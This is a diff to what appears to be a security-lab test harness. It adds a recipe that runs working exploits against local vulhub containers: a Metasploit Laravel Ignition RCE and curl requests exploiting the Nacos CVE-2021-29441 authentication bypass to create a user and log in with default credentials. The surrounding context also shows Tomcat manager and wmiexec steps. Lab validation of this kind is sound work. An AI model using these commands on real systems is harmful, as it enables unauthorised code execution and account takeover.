@@ -849,6 +849,58 @@ printf '%s\n' "$smb_out"
 curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
 printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$tomcat_out" | grep -Eiq 'nt authority\\system' && printf '%s' "$smb_out" | grep -Eq 'Executed command via wmiexec' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "mission_vulhub_multi_target": CaptureRecipe(
+        # Two genuinely distinct vulhub services, per this mission's own
+        # "different ports, different applications" objective: laravel
+        # (T1190/T1059, port resolved by the gate's vulhub_env) and nacos
+        # (T1190/T1078, brought up directly via host_setup_command on its
+        # compose-declared FIXED port 8848 -- see exec_chain.py's own
+        # comment for the tomcat/laravel port-collision story that ruled
+        # out the originally-planned T1505.003 pairing). Both exploits
+        # reused verbatim from vuln_laravel_rce/vuln_nacos_rce.
+        command=r"""laravel_out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-mvmt-laravel-proof; check; run; exit -y" 2>&1)
+printf '%s\n' "$laravel_out" | tail -30
+nacos_base="http://$TARGET_HOST:8848/nacos"
+for i in $(seq 1 40); do curl -sS -m3 -o /dev/null "$nacos_base/" 2>/dev/null && break; sleep 3; done
+nacos_user=mvmtproof
+listed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$nacos_base/v1/auth/users?pageNo=1&pageSize=10")
+created=$(curl -sS --max-time 30 -X POST -H 'User-Agent: Nacos-Server' "$nacos_base/v1/auth/users?username=$nacos_user&password=mvmtproof")
+confirmed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$nacos_base/v1/auth/users?pageNo=1&pageSize=20")
+login=$(curl -sS --max-time 30 -X POST "$nacos_base/v1/auth/users/login?username=nacos&password=nacos")
+printf '%s\n%s\n%s\n%s\n' "$listed" "$created" "$confirmed" "$login"
+printf '%s' "$laravel_out" | grep -q 'target appears to be vulnerable' && printf '%s' "$created" | grep -q 'create user ok' && printf '%s' "$confirmed" | grep -q "$nacos_user" && printf '%s' "$login" | grep -Eq 'accessToken|globalAdmin' && echo __PORTAL_RECIPE_OK__""",
+        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-mvmt-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:mvmt-laravel-rce:/tmp/portal-mvmt-laravel-proof'"''',
+        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:mvmt-laravel-rce:/tmp/portal-mvmt-laravel-proof",
+        # Polls until Nacos's listener actually accepts connections, same
+        # "container Started != ready" lesson as the tomcat attempt.
+        # Port 8848 confirmed live free (unlike 8080, which both laravel's
+        # and tomcat's own compose files hardcode -- see exec_chain.py).
+        # host_setup_command runs under a hard 30s subprocess timeout, and
+        # Nacos (a Java/Spring app) can take longer than that to finish
+        # booting -- found live 2026-08-01: polling for readiness INSIDE
+        # host_setup_command got killed by that 30s cap before Nacos ever
+        # came up (phpmyadmin's own host_setup poll loop only "gets away"
+        # with looking like it allows up to 120s because it usually
+        # resolves well inside the real 30s window in practice; it does not
+        # actually have a longer budget). Fixed by only firing the compose
+        # bringup here (fast, no polling) and moving the readiness poll into
+        # the main `command`, which runs in the sandbox under a much more
+        # generous budget (evidenced by this session's other multi-minute
+        # recipes).
+        # Runs the compose file's own image directly via `docker run` rather
+        # than `docker compose up` -- found live 2026-08-01: nacos's compose
+        # file ALSO publishes a fixed debug port (5005:5005), which some
+        # unrelated, permanently-bound host-level listener already occupies
+        # (confirmed via `nc`; not a leftover container -- `docker compose
+        # down -v` first did not free it). The exploit only needs 8848, so
+        # bypassing compose's own port list entirely (same image,
+        # vulhub/nacos:1.4.0, from /vulhub/nacos/CVE-2021-29441/docker-
+        # compose.yml) sidesteps the conflict without needing that port at
+        # all.
+        host_setup_command=r'''sh -c "docker rm -f portal-mvmt-nacos >/dev/null 2>&1; docker run -d --rm --name portal-mvmt-nacos -p 8848:8848 vulhub/nacos:1.4.0 && echo PORTAL_HOST_SETUP:nacos-launched"''',
+        host_setup_pattern=r"PORTAL_HOST_SETUP:nacos-launched",
+        host_cleanup_command=r"""sh -c "docker rm -f portal-mvmt-nacos >/dev/null 2>&1" """,
+    ),
 }
 
 
